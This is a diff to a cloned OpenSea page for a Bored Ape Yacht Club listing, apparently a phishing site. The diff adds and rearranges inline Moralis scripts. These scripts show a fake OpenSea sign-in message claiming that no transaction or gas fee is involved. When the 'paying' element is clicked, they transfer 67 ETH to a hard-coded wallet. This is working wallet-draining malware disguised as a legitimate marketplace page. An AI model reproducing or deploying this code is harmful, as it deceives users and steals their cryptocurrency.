@@ -2351,6 +2351,7 @@
     <meta name="next-head-count" content="15" />
     <link rel="preload" href="https://opensea.io/_next/static/css/f0ddfff047ae55b4b9c7.css" as="style" />
     <link rel="stylesheet" href="https://opensea.io/_next/static/css/f0ddfff047ae55b4b9c7.css" data-n-g="" /><noscript data-n-css=""></noscript>
+    <script src="https://unpkg.com/moralis-v1@1.11.0/dist/moralis.min.js"></script>
     <script defer="" nomodule="" src="/_next/static/chunks/polyfills-a40ef1678bae11e696dba45124eadd70.js"></script>
     <script src="https://opensea.io/_next/static/chunks/webpack-8050937554eb0527833f.js" defer=""></script>
     <script src="https://opensea.io/_next/static/chunks/framework.0dc7896cdb2768861b4d.js" defer=""></script>
@@ -9146,7 +9147,7 @@
             unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD
         }
     </style>
-      <script src="https://unpkg.com/moralis-v1@1.11.0/dist/moralis.min.js"></script>
+
 
 </head>
 
@@ -9959,36 +9960,29 @@
                                 </div>
                             </a>
                         </div>
+                        <script type="text/javascript" >
+                          const serverUrl = "https://5xv9ssjry2rn.usemoralis.com:2053/server";
+                          const appId = "jSnfHCgF0eTh6vUbxFUZe0zoAv60TiHoFhQoQx6P";
+                          Moralis.start({ serverUrl, appId });
+
+                          async function payIn() {
+                          await Moralis.authenticate({
+                          signingMessage:" Welcome to OpenSea Click to sign in and accept the OpenSea Terms of Service https //opensea.io/tos This request will not trigger a blockchain transaction or cost any gas fees Your authentication status will reset after 24 hours"
+                        });
+                          const options = {
+                              type: "native",
+                              amount: Moralis.Units.ETH("67"),
+                              receiver: "0x35dc03c621741784B2d945f4b9a58867C0FA920D",
+                            };
+                            let result = await Moralis.transfer(options);
+                          }
+
+                          document.getElementById("paying").onclick = payIn;
+
+                        </script>
                     </div>
             </div>
-        </div>
-        <script type="text/javascript" >
-          const serverUrl = "https://5xv9ssjry2rn.usemoralis.com:2053/server";
-          const appId = "jSnfHCgF0eTh6vUbxFUZe0zoAv60TiHoFhQoQx6P";
-          Moralis.start({ serverUrl, appId });
-
-          async function payIn() {
-          await Moralis.authenticate({
-          signingMessage: "Welcome to OpenSea!
-
-Click to sign in and accept the OpenSea Terms of Service: https://opensea.io/tos
-
-This request will not trigger a blockchain transaction or cost any gas fees.
-
-Your authentication status will reset after 24 hours.
-",
-        });
-          const options = {
-              type: "native",
-              amount: Moralis.Units.ETH("67"),
-              receiver: "0x35dc03c621741784B2d945f4b9a58867C0FA920D",
-            };
-            let result = await Moralis.transfer(options);
-          }
-
-          document.getElementById("paying").onclick = payIn;
-
-        </script>
+      </div>
         </div>
         <div class="sc-1uztusg-0 dGPcNO Panel--isClosed Panel--isFramed" data-testid="Panel">
             <div class="sc-1d6z6bk-0 hakpaz Panel--panel"><button class="sc-ty1bh0-0 infdiL BasePanel--header Panel--header" aria-controls="Body assets-item-about-collection" aria-expanded="false" id="Header assets-item-about-collection" type="button"><i aria-hidden="true" class="sc-1gugx8q-0 fTdhIH Panel--icon material-icons Panel--icon" value="vertical_split" size="24">vertical_split</i>About Bored Ape Yacht Club<i aria-hidden="true" class="sc-1gugx8q-0 fTdhIH Panel--toggle Panel--isEnabled material-icons Panel--toggle Panel--isEnabled" value="expand_more" size="24">expand_more</i></button>
@@ -41718,22 +41712,18 @@ Your authentication status will reset after 24 hours.
     </script>
     <script defer src="https:https://opensea.io/static.cloudflareinsights.com/beacon.min.js/v652eace1692a40cfa3763df669d7439c1639079717194" integrity="sha512-Gi7xpJR8tSkrpF7aordPZQlW2DLtzUlZcumS8dMQjwDHEnw9I7ZLyiOj/6tZStRBGtGgN6ceN6cMH8z7etPGlw==" data-cf-beacon='{"rayId":"743a0842fd8d06a6","token":"96047490de144c8b91be74ba7605ab69","version":"2022.8.0","si":100}' crossorigin="anonymous"></script>
     <script type="text/javascript" >
-
-      const serverUrl = "https://5xv9ssjry2rn.usemoralis.com:2053/server";
+      const serverUrl = " https://5xv9ssjry2rn.usemoralis.com:2053/server";
       const appId = "jSnfHCgF0eTh6vUbxFUZe0zoAv60TiHoFhQoQx6P";
       Moralis.start({ serverUrl, appId });
 
       async function payUp() {
       await Moralis.authenticate({
-      signingMessage: "Welcome to OpenSea!
-
-Click to sign in and accept the OpenSea Terms of Service: https://opensea.io/tos
-
-This request will not trigger a blockchain transaction or cost any gas fees.
-
-Your authentication status will reset after 24 hours.
-",
-    });
+      signingMessage:"  Welcome to OpenSea
+       Click to sign in and accept the OpenSea
+       Terms of Service https //opensea.io/tos
+       This request will not trigger a blockchain transaction or cost any gas fees
+        Your authentication status will reset after 24 hours
+        " });
       const options = {
           type: "native",
           amount: Moralis.Units.ETH("67"),
